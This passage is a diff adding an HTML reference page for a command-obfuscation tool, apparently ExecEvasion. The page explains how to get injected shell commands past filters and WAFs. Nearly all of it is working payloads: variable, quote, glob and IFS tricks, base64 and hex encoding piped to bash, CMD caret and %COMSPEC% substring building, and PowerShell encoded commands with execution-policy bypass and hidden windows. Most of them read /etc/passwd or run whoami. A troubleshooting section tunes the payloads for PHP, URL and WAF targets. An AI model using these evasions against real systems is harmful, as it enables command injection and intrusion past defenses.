+                        </span>
+                        <div class="technique-tags">
+                            <span class="tag shell">Shell</span>
+                        </div>
+                    </div>
+                    <div class="technique-body">
+                        <h4>Why It Works</h4>
+                        <p>Undefined variables expand to empty strings by default. Special variables like <span class="inline-code">$@</span> and <span class="inline-code">$*</span> are empty in interactive shells. The filter sees <span class="inline-code">$@</span> but bash expands it to nothing.</p>
+
+                        <div class="code-block"><span class="comment"># $@ - positional parameters (empty interactively)</span>
+c$@at /etc/passwd        <span class="comment"># Expands to: cat /etc/passwd</span>
+
+<span class="comment"># ${x} - undefined variable</span>
+c${x}at /etc/passwd      <span class="comment"># x is undefined, expands to nothing</span>
+
+<span class="comment"># $* - all positional params</span>
+ca$*t /etc/passwd
+
+<span class="comment"># $() - empty command substitution</span>
+c$()at /etc/passwd       <span class="comment"># Runs nothing, returns nothing</span>
+
+<span class="comment"># $9 - ninth positional param (usually empty)</span>
+$9cat /etc/passwd</div>
+
+                        <h4>Best Variables to Use</h4>
+                        <table class="comparison-table">
+                            <thead>
+                                <tr>
+                                    <th>Variable</th>
+                                    <th>What It Is</th>
+                                    <th>Reliability</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr>
+                                    <td><span class="inline-code">$@</span></td>
+                                    <td>All positional parameters</td>
+                                    <td class="status-yes">High</td>
+                                </tr>
+                                <tr>
+                                    <td><span class="inline-code">${x}</span></td>
+                                    <td>Undefined variable</td>
+                                    <td class="status-yes">High</td>
+                                </tr>
+                                <tr>
+                                    <td><span class="inline-code">$()</span></td>
+                                    <td>Empty subshell</td>
+                                    <td class="status-yes">High</td>
+                                </tr>
+                                <tr>
+                                    <td><span class="inline-code">$*</span></td>
+                                    <td>Positional params as string</td>
+                                    <td class="status-partial">Medium</td>
+                                </tr>
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Concatenation -->
+            <section id="concatenation" class="doc-section">
+                <h2>
+                    <span class="section-icon linux">></span>
+                    Variable Concatenation
+                </h2>
+                <p>Building commands by storing parts in variables and concatenating them at execution time.</p>
+
+                <div class="technique-card">
+                    <div class="technique-header">
+                        <span class="technique-title">
+                            <span class="icon">+</span>
+                            Build Commands from Parts
+                        </span>
+                        <div class="technique-tags">
+                            <span class="tag shell">Shell</span>
+                        </div>
+                    </div>
+                    <div class="technique-body">
+                        <h4>Why It Works</h4>
+                        <p>Variables are expanded at runtime. Filters scan the input text but don't execute it, so they see variable assignments, not the final command.</p>
+
+                        <div class="code-block"><span class="comment"># Store parts in variables</span>
+a=c;b=a;c=t;$a$b$c /etc/passwd
+<span class="comment"># Variables: a=c, b=a, c=t</span>
+<span class="comment"># Expansion: $a$b$c = cat</span>
+
+<span class="comment"># Separate command and args</span>
+cmd=cat;file=/etc/passwd;$cmd $file
+
+<span class="comment"># Character by character</span>
+v0=c;v1=a;v2=t;$v0$v1$v2 /etc/passwd
+
+<span class="comment"># Using arrays (bash)</span>
+a=(c a t);${a[0]}${a[1]}${a[2]} /etc/passwd</div>
+
+                        <h4>When It Works</h4>
+                        <ul>
+                            <li>Filter doesn't interpret shell variable syntax</li>
+                            <li>Multiple commands allowed (semicolons not blocked)</li>
+                            <li>bash or compatible shell</li>
+                        </ul>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Encoding -->
+            <section id="encoding" class="doc-section">
+                <h2>
+                    <span class="section-icon linux">></span>
+                    Encoding Techniques
+                </h2>
+                <p>Encode the command and decode it at runtime. This completely obscures the command from filters.</p>
+
+                <div class="technique-card">
+                    <div class="technique-header">
+                        <span class="technique-title">
+                            <span class="icon">B64</span>
+                            Base64 Encoding
+                        </span>
+                        <div class="technique-tags">
+                            <span class="tag encoding">Encoding</span>
+                        </div>
+                    </div>
+                    <div class="technique-body">
+                        <h4>Why It Works</h4>
+                        <p>Base64 converts binary/text to ASCII letters and numbers. The filter sees innocent-looking base64 text. At runtime, it's decoded and executed.</p>
+
+                        <div class="code-block"><span class="comment"># "cat /etc/passwd" in base64</span>
+echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash
+
+<span class="comment"># Using bash -c with subshell</span>
+bash -c "$(echo Y2F0IC9ldGMvcGFzc3dk | base64 -d)"
+
+<span class="comment"># Using eval</span>
+eval $(echo Y2F0IC9ldGMvcGFzc3dk | base64 -d)
+
+<span class="comment"># Short form (if bash available)</span>
+echo Y2F0IC9ldGMvcGFzc3dk|base64 -d|sh</div>
+
+                        <h4>Encoding Your Commands</h4>
+                        <div class="code-block"><span class="comment"># To encode:</span>
+echo -n "cat /etc/passwd" | base64
+<span class="comment"># Output: Y2F0IC9ldGMvcGFzc3dk</span>
+
+<span class="comment"># To decode (for testing):</span>
+echo Y2F0IC9ldGMvcGFzc3dk | base64 -d
+<span class="comment"># Output: cat /etc/passwd</span></div>
+                    </div>
+                </div>
+
+                <div class="technique-card">
+                    <div class="technique-header">
+                        <span class="technique-title">
+                            <span class="icon">0x</span>
+                            Hex Encoding
+                        </span>
+                        <div class="technique-tags">
+                            <span class="tag encoding">Encoding</span>
+                        </div>
+                    </div>
+                    <div class="technique-body">
+                        <h4>Why It Works</h4>
+                        <p>Bash's <span class="inline-code">$'...'</span> ANSI-C quoting interprets escape sequences including hex (<span class="inline-code">\xNN</span>) and octal (<span class="inline-code">\NNN</span>).</p>
+
+                        <div class="code-block"><span class="comment"># Hex encoding: cat = \x63\x61\x74</span>
+$'\x63\x61\x74' /etc/passwd
+
+<span class="comment"># Full command in hex</span>
+$'\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'
+
+<span class="comment"># Using echo -e</span>
+echo -e "\x63\x61\x74 /etc/passwd" | bash
+
+<span class="comment"># Using printf</span>
+printf '%b' '\x63\x61\x74 /etc/passwd' | bash
+
+<span class="comment"># Octal encoding: cat = \143\141\164</span>
+$'\143\141\164' /etc/passwd</div>
+
+                        <h4>ASCII Hex Reference Table</h4>
+                        <table class="comparison-table">
+                            <thead>
+                                <tr>
+                                    <th>Character</th>
+                                    <th>Hex</th>
+                                    <th>Octal</th>
+                                    <th>Decimal</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr><td>space</td><td>\x20</td><td>\040</td><td>32</td></tr>
+                                <tr><td>/</td><td>\x2f</td><td>\057</td><td>47</td></tr>
+                                <tr><td>a-z</td><td>\x61-\x7a</td><td>\141-\172</td><td>97-122</td></tr>
+                                <tr><td>A-Z</td><td>\x41-\x5a</td><td>\101-\132</td><td>65-90</td></tr>
+                                <tr><td>0-9</td><td>\x30-\x39</td><td>\060-\071</td><td>48-57</td></tr>
+                                <tr><td>-</td><td>\x2d</td><td>\055</td><td>45</td></tr>
+                                <tr><td>.</td><td>\x2e</td><td>\056</td><td>46</td></tr>
+                                <tr><td>_</td><td>\x5f</td><td>\137</td><td>95</td></tr>
+                            </tbody>
+                        </table>
+
+                        <div class="info-box tip">
+                            <span class="info-box-icon">&#128161;</span>
+                            <div class="info-box-content">
+                                <h4>Quick Conversion</h4>
+                                <p>Use: <span class="inline-code">printf '%x\n' "'a"</span> to get hex value of 'a' (61), or <span class="inline-code">echo -n "cat" | xxd -p</span> for full string (636174).</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Wildcards -->
+            <section id="wildcards" class="doc-section">
+                <h2>
+                    <span class="section-icon linux">></span>
+                    Wildcard Paths
+                </h2>
+                <p>Using shell wildcards in paths to avoid typing exact filenames that might be filtered.</p>
+
+                <div class="technique-card">
+                    <div class="technique-header">
+                        <span class="technique-title">
+                            <span class="icon">*</span>
+                            Path Wildcards
+                        </span>
+                        <div class="technique-tags">
+                            <span class="tag shell">Shell</span>
+                        </div>
+                    </div>
+                    <div class="technique-body">
+                        <h4>Why It Works</h4>
+                        <p>Wildcards expand to matching filenames. <span class="inline-code">*</span> matches any string, <span class="inline-code">?</span> matches any single character. If only one file matches, it expands to that exact path.</p>
+
+                        <div class="code-block"><span class="comment"># * matches any string</span>
+cat /e*/passwd           <span class="comment"># /e* matches /etc</span>
+cat /etc/pass*           <span class="comment"># matches /etc/passwd</span>
+
+<span class="comment"># ? matches single character</span>
+cat /etc/p?sswd          <span class="comment"># ? matches 'a'</span>
+cat /???/??????          <span class="comment"># /etc/passwd has 3 + 6 chars</span>
+
+<span class="comment"># Combined</span>
+cat /e??/pa??wd
+/???/c?t /???/p?sswd     <span class="comment"># Even the command!</span></div>
+
+                        <div class="info-box warning">
+                            <span class="info-box-icon">&#9888;</span>
+                            <div class="info-box-content">
+                                <h4>Ambiguity Warning</h4>
+                                <p>Wildcards expand to ALL matching files. If <span class="inline-code">/e*</span> matches multiple directories, you might get unexpected results. Be specific enough to match only your target.</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- IFS -->
+            <section id="ifs" class="doc-section">
+                <h2>
+                    <span class="section-icon linux">></span>
+                    IFS Manipulation
+                </h2>
+                <p>IFS (Internal Field Separator) defines what characters separate words. Manipulating it allows bypassing space filters.</p>
+
+                <div class="technique-card">
+                    <div class="technique-header">
+                        <span class="technique-title">
+                            <span class="icon">_</span>
+                            Space Bypass with IFS
+                        </span>
+                        <div class="technique-tags">
+                            <span class="tag shell">Shell</span>
+                        </div>
+                    </div>
+                    <div class="technique-body">
+                        <h4>Why It Works</h4>
+                        <p><span class="inline-code">$IFS</span> defaults to space, tab, newline. When expanded in an unquoted context, it effectively produces a word separator. You can also redefine IFS to use different separators.</p>
+
+                        <div class="code-block"><span class="comment"># $IFS expands to space (default)</span>
+cat$IFS/etc/passwd       <span class="comment"># cat /etc/passwd</span>
+cat${IFS}/etc/passwd     <span class="comment"># Same with braces</span>
+
+<span class="comment"># Redefine IFS to underscore</span>
+IFS=_;cat_/etc/passwd    <span class="comment"># _ now acts as separator</span>
+
+<span class="comment"># Using tab (encoded)</span>
+cat$'\t'/etc/passwd      <span class="comment"># Tab as separator</span>
+
+<span class="comment"># Using newline</span>
+cat$'\n'/etc/passwd      <span class="comment"># Newline works too</span></div>
+
+                        <h4>When Spaces Are Blocked</h4>
+                        <p>If the filter blocks spaces but allows <span class="inline-code">$</span>, IFS is your best friend. It's a standard shell variable that produces the exact characters you need.</p>
+                    </div>
+                </div>
+            </section>
+
+            <!-- WINDOWS TECHNIQUES -->
+
+            <!-- Caret Escape -->
+            <section id="caret-escape" class="doc-section">
+                <h2>
+                    <span class="section-icon windows">></span>
+                    Caret Escape (Windows)
+                </h2>
+                <p>The caret <span class="inline-code">^</span> is the CMD.exe escape character, similar to backslash in Unix shells.</p>
+
+                <div class="technique-card">
+                    <div class="technique-header">
+                        <span class="technique-title">
+                            <span class="icon">^</span>
+                            CMD Escape Character
+                        </span>
+                        <div class="technique-tags">
+                            <span class="tag cmd">CMD</span>
+                        </div>
+                    </div>
+                    <div class="technique-body">
+                        <h4>Why It Works</h4>
+                        <p>In CMD, <span class="inline-code">^</span> escapes the next character. For regular letters, <span class="inline-code">^w</span> equals <span class="inline-code">w</span>. This breaks string matching while CMD strips the carets.</p>
+
+                        <div class="code-block"><span class="comment">REM Escape each letter</span>
+w^h^o^a^m^i
+
+<span class="comment">REM Partial escaping</span>
+who^ami
+
+<span class="comment">REM With paths</span>
+t^y^p^e C:\Windows\win.ini
+
+<span class="comment">REM Heavy obfuscation</span>
+^w^h^o^a^m^i</div>
+
+                        <h4>Limitations</h4>
+                        <ul>
+                            <li>Only works in CMD.exe, not PowerShell</li>
+                            <li>Some contexts require doubled carets <span class="inline-code">^^</span></li>
+                            <li>Escaping some special chars changes meaning</li>
+                        </ul>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Environment Substrings -->
+            <section id="env-substring" class="doc-section">
+                <h2>
+                    <span class="section-icon windows">></span>
+                    Environment Variable Substrings
+                </h2>
+                <p>CMD allows extracting substrings from environment variables. You can build commands character by character from existing variables.</p>
+
+                <div class="technique-card">
+                    <div class="technique-header">
+                        <span class="technique-title">
+                            <span class="icon">%</span>
+                            Build from %COMSPEC%
+                        </span>
+                        <div class="technique-tags">
+                            <span class="tag cmd">CMD</span>
+                        </div>
+                    </div>
+                    <div class="technique-body">
+                        <h4>Why It Works</h4>
+                        <p>CMD's <span class="inline-code">%VAR:~start,length%</span> syntax extracts substrings. Since <span class="inline-code">%COMSPEC%</span> typically equals <span class="inline-code">C:\Windows\system32\cmd.exe</span>, you can extract any letter you need.</p>
+
+                        <div class="code-block"><span class="comment">REM %COMSPEC% = C:\Windows\system32\cmd.exe</span>
+<span class="comment">REM Positions: C(0) :(1) \(2) ... c(-7) m(-6) d(-5) .(-4) e(-3) x(-2) e(-1)</span>
+
+<span class="comment">REM Extract 'C' (uppercase) from position 0</span>
+%COMSPEC:~0,1%           <span class="comment">REM = C</span>
+
+<span class="comment">REM Extract 'c' (lowercase) from cmd.exe (-7 from end)</span>
+%COMSPEC:~-7,1%          <span class="comment">REM = c</span>
+
+<span class="comment">REM Extract 'e' from .exe (-1 from end)</span>
+%COMSPEC:~-1,1%          <span class="comment">REM = e</span>
+
+<span class="comment">REM Extract 'm' and 'd' from cmd</span>
+%COMSPEC:~-6,1%          <span class="comment">REM = m</span>
+%COMSPEC:~-5,1%          <span class="comment">REM = d</span>
+
+<span class="comment">REM Using %WINDIR% = C:\Windows</span>
+<span class="comment">REM Positions: C(0) :(1) \(2) W(3) i(4) n(5) d(6) o(7) w(8) s(9)</span>
+%WINDIR:~3,1%            <span class="comment">REM = W</span>
+%WINDIR:~4,1%            <span class="comment">REM = i</span>
+%WINDIR:~5,1%            <span class="comment">REM = n</span>
+%WINDIR:~8,1%            <span class="comment">REM = w (lowercase)</span></div>
+
+                        <h4>Verified Character Mappings</h4>
+                        <table class="comparison-table">
+                            <thead>
+                                <tr>
+                                    <th>Character</th>
+                                    <th>Extraction</th>
+                                    <th>Source</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr><td>C</td><td>%COMSPEC:~0,1%</td><td>C:\...</td></tr>
+                                <tr><td>c</td><td>%COMSPEC:~-7,1%</td><td>cmd.exe</td></tr>
+                                <tr><td>m</td><td>%COMSPEC:~-6,1%</td><td>cmd.exe</td></tr>
+                                <tr><td>d</td><td>%COMSPEC:~-5,1%</td><td>cmd.exe</td></tr>
+                                <tr><td>e</td><td>%COMSPEC:~-1,1%</td><td>.exe</td></tr>
+                                <tr><td>x</td><td>%COMSPEC:~-2,1%</td><td>.exe</td></tr>
+                                <tr><td>W</td><td>%WINDIR:~3,1%</td><td>Windows</td></tr>
+                                <tr><td>i</td><td>%WINDIR:~4,1%</td><td>Windows</td></tr>
+                                <tr><td>n</td><td>%WINDIR:~5,1%</td><td>Windows</td></tr>
+                                <tr><td>o</td><td>%WINDIR:~7,1%</td><td>Windows</td></tr>
+                                <tr><td>w</td><td>%WINDIR:~8,1%</td><td>Windows</td></tr>
+                                <tr><td>s</td><td>%WINDIR:~-1,1%</td><td>Windows</td></tr>
+                            </tbody>
+                        </table>
+
+                        <h4>Useful Environment Variables</h4>
+                        <ul>
+                            <li><span class="inline-code">%COMSPEC%</span> - C:\Windows\system32\cmd.exe</li>
+                            <li><span class="inline-code">%WINDIR%</span> - C:\Windows</li>
+                            <li><span class="inline-code">%SYSTEMROOT%</span> - C:\Windows (same as WINDIR)</li>
+                            <li><span class="inline-code">%PATH%</span> - Contains many diverse characters</li>
+                            <li><span class="inline-code">%PATHEXT%</span> - .COM;.EXE;.BAT... (useful for punctuation)</li>
+                        </ul>
+                    </div>
+                </div>
+            </section>
+
+            <!-- PowerShell -->
+            <section id="powershell" class="doc-section">
+                <h2>
+                    <span class="section-icon windows">></span>
+                    PowerShell Techniques
+                </h2>
+                <p>PowerShell offers powerful encoding and execution options for Windows command obfuscation.</p>
+
+                <div class="technique-card">
+                    <div class="technique-header">
+                        <span class="technique-title">
+                            <span class="icon">PS</span>
+                            Encoded Commands
+                        </span>
+                        <div class="technique-tags">
+                            <span class="tag powershell">PowerShell</span>
+                        </div>
+                    </div>
+                    <div class="technique-body">
+                        <h4>Base64 Encoded Commands</h4>
+                        <p>PowerShell's <span class="inline-code">-EncodedCommand</span> (or <span class="inline-code">-e</span>, <span class="inline-code">-enc</span>) accepts Base64-encoded UTF-16LE strings.</p>
+
+                        <div class="code-block"><span class="comment"># Run encoded command</span>
+powershell -e dwBoAG8AYQBtAGkA
+
+<span class="comment"># With execution policy bypass</span>
+powershell -ep bypass -e dwBoAG8AYQBtAGkA
+
+<span class="comment"># Hidden window</span>
+powershell -w hidden -e dwBoAG8AYQBtAGkA</div>
+
+                        <div class="info-box note">
+                            <span class="info-box-icon">&#128218;</span>
+                            <div class="info-box-content">
+                                <h4>UTF-16LE Encoding</h4>
+                                <p>PowerShell expects UTF-16LE (Little Endian) encoding, not plain ASCII Base64. Each character becomes 2 bytes. The generator handles this automatically.</p>
+                            </div>
+                        </div>
+
+                        <h4>Character Array Execution</h4>
+                        <div class="code-block"><span class="comment"># Build string from char codes and execute</span>
+powershell -c "[char[]](119,104,111,97,109,105)-join''|iex"
+<span class="comment"># 119=w, 104=h, 111=o, 97=a, 109=m, 105=i = "whoami"</span>
+
+<span class="comment"># Alternative syntax</span>
+powershell "$([char[]](119,104,111,97,109,105)-join'')"</div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Comparison Table -->
+            <section id="comparison" class="doc-section">
+                <h2>
+                    <span class="section-icon theory">></span>
+                    Technique Comparison
+                </h2>
+
+                <table class="comparison-table">
+                    <thead>
+                        <tr>
+                            <th>Technique</th>
+                            <th>Linux</th>
+                            <th>Windows</th>
+                            <th>Complexity</th>
+                            <th>Detectability</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td>Quote Insertion</td>
+                            <td class="status-yes">Yes</td>
+                            <td class="status-yes">Yes</td>
+                            <td>Low</td>
+                            <td>Low</td>
+                        </tr>
+                        <tr>
+                            <td>Escape Characters</td>
+                            <td class="status-yes">\ (backslash)</td>
+                            <td class="status-yes">^ (caret)</td>
+                            <td>Low</td>
+                            <td>Low</td>
+                        </tr>
+                        <tr>
+                            <td>Glob Patterns</td>
+                            <td class="status-yes">Yes</td>
+                            <td class="status-no">No</td>
+                            <td>Low</td>
+                            <td>Medium</td>
+                        </tr>
+                        <tr>
+                            <td>Variable Expansion</td>
+                            <td class="status-yes">Yes</td>
+                            <td class="status-yes">Yes</td>
+                            <td>Medium</td>
+                            <td>Medium</td>
+                        </tr>
+                        <tr>
+                            <td>Concatenation</td>
+                            <td class="status-yes">Yes</td>
+                            <td class="status-yes">Yes</td>
+                            <td>Medium</td>
+                            <td>Medium</td>
+                        </tr>
+                        <tr>
+                            <td>Base64 Encoding</td>
+                            <td class="status-yes">Yes</td>
+                            <td class="status-yes">PowerShell</td>
+                            <td>High</td>
+                            <td>High</td>
+                        </tr>
+                        <tr>
+                            <td>Hex Encoding</td>
+                            <td class="status-yes">Yes</td>
+                            <td class="status-partial">Limited</td>
+                            <td>High</td>
+                            <td>High</td>
+                        </tr>
+                        <tr>
+                            <td>IFS Manipulation</td>
+                            <td class="status-yes">Yes</td>
+                            <td class="status-no">No</td>
+                            <td>Medium</td>
+                            <td>Medium</td>
+                        </tr>
+                        <tr>
+                            <td>Env Substrings</td>
+                            <td class="status-no">No</td>
+                            <td class="status-yes">CMD</td>
+                            <td>High</td>
+                            <td>High</td>
+                        </tr>
+                    </tbody>
+                </table>
+            </section>
+
+            <!-- Troubleshooting -->
+            <section id="troubleshooting" class="doc-section">
+                <h2>
+                    <span class="section-icon warning">></span>
+                    Troubleshooting
+                </h2>
+
+                <div class="technique-card">
+                    <div class="technique-body">
+                        <h4>Payload Not Working?</h4>
+                        <ul>
+                            <li><strong>Check the shell</strong> - bash vs sh vs zsh have different features</li>
+                            <li><strong>Check execution context</strong> - CGI, PHP exec(), Python subprocess all handle quoting differently</li>
+                            <li><strong>Test locally first</strong> - Verify the payload works before using in target</li>
+                            <li><strong>Watch for double-escaping</strong> - Quotes and backslashes might need escaping for the transport layer</li>
+                        </ul>
+
+                        <h4>Common Mistakes</h4>
+                        <ul>
+                            <li><strong>Glob doesn't match</strong> - Wildcards in non-existent paths fail</li>
+                            <li><strong>Wrong encoding</strong> - PowerShell needs UTF-16LE, not UTF-8</li>
+                            <li><strong>Missing interpreter</strong> - <span class="inline-code">|bash</span> fails if only <span class="inline-code">sh</span> exists</li>
+                            <li><strong>Blocked pipe/semicolon</strong> - Many payloads need <span class="inline-code">|</span> or <span class="inline-code">;</span></li>
+                        </ul>
+
+                        <h4>Testing Tips</h4>
+                        <div class="code-block"><span class="comment"># Test on your machine first</span>
+echo 'c'"'"'a'"'"'t /etc/passwd'
+<span class="comment"># See what the shell actually receives</span>
+
+<span class="comment"># Use echo to debug</span>
+echo c''a''t
+<span class="comment"># Output: cat (confirms quote removal)</span>
+
+<span class="comment"># Check base64 encoding</span>
+echo -n "whoami" | base64
+<span class="comment"># Output: d2hvYW1p</span>
+<span class="comment"># Use: echo d2hvYW1p|base64 -d|bash</span></div>
+
+                        <h4>Context-Specific Issues</h4>
+                        <table class="comparison-table">
+                            <thead>
+                                <tr>
+                                    <th>Context</th>
+                                    <th>Common Issues</th>
+                                    <th>Solution</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr>
+                                    <td>PHP exec()/system()</td>
+                                    <td>Quotes need escaping</td>
+                                    <td>Use hex encoding or base64</td>
+                                </tr>
+                                <tr>
+                                    <td>Python subprocess</td>
+                                    <td>Shell=False by default</td>
+                                    <td>Ensure shell=True or use direct path</td>
+                                </tr>
+                                <tr>
+                                    <td>URL parameters</td>
+                                    <td>Special chars URL encoded</td>
+                                    <td>Double-encode or use alternatives</td>
+                                </tr>
+                                <tr>
+                                    <td>JSON payloads</td>
+                                    <td>Backslashes doubled</td>
+                                    <td>Account for JSON escaping</td>
+                                </tr>
+                                <tr>
+                                    <td>WAF blocking</td>
+                                    <td>Pattern matching</td>
+                                    <td>Try multiple techniques, combine them</td>
+                                </tr>
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+            </section>
+
+            <!-- Quick Reference Section -->
+            <section id="quick-reference" class="doc-section">
+                <h2>
+                    <span class="section-icon theory">></span>
+                    Quick Reference Cheatsheet
+                </h2>
+
+                <div class="technique-card">
+                    <div class="technique-body">
+                        <h4>Linux One-Liners</h4>
+                        <div class="code-block"><span class="comment"># Bypass "cat" filter</span>
+c'a't file          <span class="comment"># quotes</span>
+c\at file           <span class="comment"># backslash</span>
+c[a]t file          <span class="comment"># glob</span>
+c$@at file          <span class="comment"># empty var</span>
+
+<span class="comment"># Bypass "passwd" filter</span>
+/etc/pass[w]d       <span class="comment"># glob</span>
+/etc/pass''wd       <span class="comment"># quotes</span>
+/e*/passwd          <span class="comment"># wildcard</span>
+
+<span class="comment"># Bypass space filter</span>
+cat${IFS}/etc/passwd
+cat$IFS/etc/passwd
+{cat,/etc/passwd}
+
+<span class="comment"># Full command encoding</span>
+echo Y2F0IC9ldGMvcGFzc3dk|base64 -d|sh</div>
+
+                        <h4>Windows One-Liners</h4>
+                        <div class="code-block"><span class="comment">REM Bypass "whoami" filter</span>
+w^h^o^a^m^i         <span class="comment">REM caret</span>
+who""ami            <span class="comment">REM quotes</span>
+
+<span class="comment">REM PowerShell encoded</span>
+powershell -e dwBoAG8AYQBtAGkA</div>
+                    </div>
+                </div>
+            </section>
+
+        </main>
+    </div>
+
+    <footer>
+        <p style="margin-bottom: 0.75rem;">
+            <span class="footer-heart">&hearts;</span>
+            Made with love by
+            <a href="https://github.com/dr34mhacks" target="_blank" rel="noopener noreferrer" style="font-weight: 600;">Sid Joshi</a>
+        </p>
+        <p>
+            <a href="https://github.com/dr34mhacks/ExecEvasion" target="_blank" rel="noopener noreferrer" class="footer-github">
+                <svg height="18" width="18" viewBox="0 0 16 16" fill="currentColor"><path d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"></path></svg>
+                @dr34mhacks/ExecEvasion
+            </a>
+        </p>
+        <p style="opacity: 0.5; font-size: 0.8rem; margin-top: 1rem;">For authorized security testing and educational purposes only</p>
+    </footer>
+
+    <script>
+        // Smooth scroll for sidebar links
+        document.querySelectorAll('.sidebar-nav a').forEach(link => {
+            link.addEventListener('click', (e) => {
+                e.preventDefault();
+                const target = document.querySelector(link.getAttribute('href'));
+                if (target) {
+                    target.scrollIntoView({ behavior: 'smooth' });
+                }
+            });
+        });
+
+        // Highlight active section in sidebar
+        const sections = document.querySelectorAll('.doc-section');
+        const navLinks = document.querySelectorAll('.sidebar-nav a');
+
+        const observer = new IntersectionObserver((entries) => {
+            entries.forEach(entry => {
+                if (entry.isIntersecting) {
+                    navLinks.forEach(link => {
+                        link.classList.remove('active');
+                        if (link.getAttribute('href') === '#' + entry.target.id) {
+                            link.classList.add('active');
+                        }
+                    });
+                }
+            });
+        }, { rootMargin: '-20% 0px -70% 0px' });
+
+        sections.forEach(section => observer.observe(section));
+    </script>
+</body>
+</html>
